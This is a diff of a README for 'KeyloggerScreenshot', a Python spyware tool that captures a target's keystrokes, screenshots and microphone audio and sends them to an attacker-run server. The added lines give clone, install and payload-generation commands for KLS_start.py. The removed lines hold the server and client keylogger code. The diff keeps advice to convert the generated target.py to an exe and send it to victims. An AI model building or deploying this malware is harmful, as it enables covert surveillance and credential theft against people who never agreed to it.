@@ -5,78 +5,52 @@ Created by: Fawaz Bashiru
 
 KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Follow the instructions to build your own server in "KeyloggerScreenshot"
 
-To install KeyloggerScreenshot simply type:
+If you are a Linux user then write. To change root:
 
-`pip install KeyloggerScreenshot`
+`sudo -i`
 
 In your terminal
+
+To clone KeyloggerScreenshot simply type:
+
+`git clone https://github.com/Facileee/KeyloggerScreenshot.git`
+
+In your terminal
+
+Continue by writing: 
+
+`cd KeyloggerScreenshot`
+
+Install all requirements:
+
+`pip install -r requirements.txt`
+
 
 HOW DOES KeyloggerScreenshot WORK?
 ==================================
 
-This module can be used in Windows and Linux
+Write your IP-Address in KLS_start.py
+`python KLS_start.py -aip 127.0.0.1`
 
-The servers can now be run in the same file with the module threading
+To create a file: 
+`python KLS_start.py -aip 127.0.0.1 -cf`
 
-The port number for each server should be different
+You can also specify the filename simply write the filename after -cf
+`python KLS_start.py -aip 127.0.0.1 -cf test.py`
 
-The server should obviously be run before the client
+The standard filename is target.py
 
-You can just copy the following code and insert you ip-address in the variable "ip"
+You can also specify the seconds which is going to be run at the target
 
-You can find your ip-address in the command line by using the command "ipconfig"
+`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120`
 
-For example:
-===========
--------
-Servers
-------
-```python
-#EveryServer.py:
-import KeyloggerScreenshot as ks
-import threading
+The default seconds is 60
 
-ip = "127.0.0.1"
+After running the code you can send the created filename
 
-ip_photos, port_photos = ip, 1111
-server_photos = ks.ServerPhotos(ip_photos, port_photos)
+After the specified seconds your directory will look like this: 
 
-ip_keylogger, port_keylogger = ip, 2222
-server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)
-
-ip_listener, port_listener = ip, 3333
-server_listener = ks.ServerListener(ip_listener, port_listener)
-
-ip_time, port_time = ip, 4444
-server_time = ks.Timer(ip_time, port_time)
-
-threading_server = threading.Thread(target=server_photos.start)
-threading_server.start()
-
-threading_server2 = threading.Thread(target=server_keylogger.start)
-threading_server2.start()
-
-threading_server3 = threading.Thread(target=server_listener.start)
-threading_server3.start()
-
-threading_server4 = threading.Thread(target=server_time.start_timer)
-threading_server4.start()
-
-```
-
-Every screenshots, photos and audio files will be saved locally where your server is located even if the connection isn't stable. 
-
-Client_Target
--------------
-```python
-#client_target.py
-import KeyloggerScreenshot as ks
-
-ip = "127.0.0.1"
-key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60)
-key_client.start()
-
-```
+![img_1.png](img_1.png)
 
 Output
 ------
@@ -91,7 +65,7 @@ White: Timer
 Waiting for connection....Waiting for connection...
 Waiting for connection...
 
-Connection has been established with the ip 127.0.0.1
+Connection has been established ![img_2.png](img_2.png)with the ip 127.0.0.1
 Time left: 02:59
 
 Connection has been established with ('127.0.0.1', 63822)
@@ -127,13 +101,9 @@ Waiting for connection...
 """
 ```
 
-Your current directory
----------------------
-![img.png](img.png)
-
 Additional
 ==========
-* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"
+* You can send "target.py" as an exe file to the target with "auto-py-to-exe"
 
 * KeyloggerScreenshot is very easy to use.
 
